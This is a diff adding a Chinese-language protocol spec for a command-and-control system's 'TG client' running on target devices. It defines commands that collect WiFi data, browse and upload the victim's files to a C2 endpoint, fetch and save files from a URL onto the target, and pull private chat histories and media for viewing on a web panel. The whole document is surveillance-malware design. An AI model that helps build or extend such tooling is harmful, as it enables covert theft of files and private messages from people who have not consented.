@@ -271,3 +271,92 @@ String upperDataKey = "UserComment";
 
 **建议代码逻辑位置**：
 `C2Controller.java` -> `submitTaskResult` 方法 -> `if (task != null)` 块内部 -> 在更新任务状态之后。
+
+## TG 客户端对接协议与开发建议 (Protocol & Suggestions for TG Client)
+
+为了实现 Web 端对目标设备的更精细化管理（文件浏览、实时聊天记录查看），请 TG 客户端开发同事参考以下协议规范进行对接。
+
+### 1. WiFi 模块 (WiFi Module)
+
+*   **现状**: `heartbeat.cpp` 中 `collectWiFiInfo` 已采集数据入库，但 `get_wifi` 返回的 JSON 格式需标准化。
+*   **命令**: `get_wifi`
+*   **建议返回 JSON 格式**:
+    ```json
+    [
+      {
+        "ssid": "MyWiFi",
+        "bssid": "00:11:22:33:44:55",
+        "signal": -50,
+        "auth": "WPA2-Personal"
+      },
+      ...
+    ]
+    ```
+*   **后端处理**: 后端将解析此 JSON 并存入 `c2_wifi` 表。
+
+### 2. 文件管理模块 (File Management)
+
+目前客户端仅支持 `scan_recent` (最近文件) 和 `scan_disk` (全盘扫描入库)，缺少实时文件浏览功能。
+
+#### 2.1 获取文件列表 (新增需求)
+*   **命令**: `get_file_list`
+*   **参数**: `path` (目标文件夹路径，如 "C:\\Users")
+*   **建议返回 JSON 格式**:
+    ```json
+    [
+      {
+        "name": "Documents",
+        "path": "C:\\Users\\Documents",
+        "is_dir": true,
+        "size": 0,
+        "last_modified": "2023-10-01 12:00:00"
+      },
+      {
+        "name": "secret.txt",
+        "path": "C:\\Users\\secret.txt",
+        "is_dir": false,
+        "size": 1024,
+        "last_modified": "2023-10-02 14:30:00"
+      }
+    ]
+    ```
+
+#### 2.2 文件传输 (命令澄清)
+*   **Client Upload (Web端下载)**:
+    *   **命令**: `upload_file` (现有命令 `download` 命名易混淆，建议统一使用 `upload_file`)
+    *   **参数**: `filePath` (目标机文件路径)
+    *   **行为**: 客户端将指定文件 POST 上传至 `/api/c2/upload`。
+*   **Client Download (Web端上传)**:
+    *   **命令**: `download_file` (新增需求)
+    *   **参数**: `url` (下载链接), `savePath` (保存路径)
+    *   **行为**: 客户端从指定 URL 下载文件并保存到本地。
+
+### 3. TG 聊天模块 (Chat Module)
+
+目前客户端通过 `uploadClientDb` 上传 SQLite 数据库文件，后端解析滞后且开销大。为了支持 Web 端实时查看聊天记录，建议增加 JSON 接口。
+
+#### 3.1 获取聊天记录 (新增建议)
+*   **命令**: `get_chat_history_json`
+*   **参数**: `chat_id` (会话ID), `limit` (条数), `offset_id` (可选)
+*   **建议返回 JSON 格式**:
+    ```json
+    [
+      {
+        "msg_id": 12345,
+        "chat_id": "100123456",
+        "sender_id": "987654321",
+        "sender_name": "Alice",
+        "content": "Hello World",
+        "timestamp": 1696123456,
+        "is_outgoing": false,
+        "media_path": "Photo:123" // 如有媒体文件
+      }
+    ]
+    ```
+*   **优势**: 相比上传整个 DB，JSON 传输更轻量，Web 端可直接展示。
+
+### 4. 媒体文件处理
+*   聊天记录中的图片/视频目前仅记录了 `media_path`。
+*   **建议**: 对于缩略图或小文件，客户端可随聊天记录 JSON 一并上传（Base64 或 独立上传后返回 URL）。
+*   或者提供 `get_media` 命令，按需上传指定的媒体文件。
+
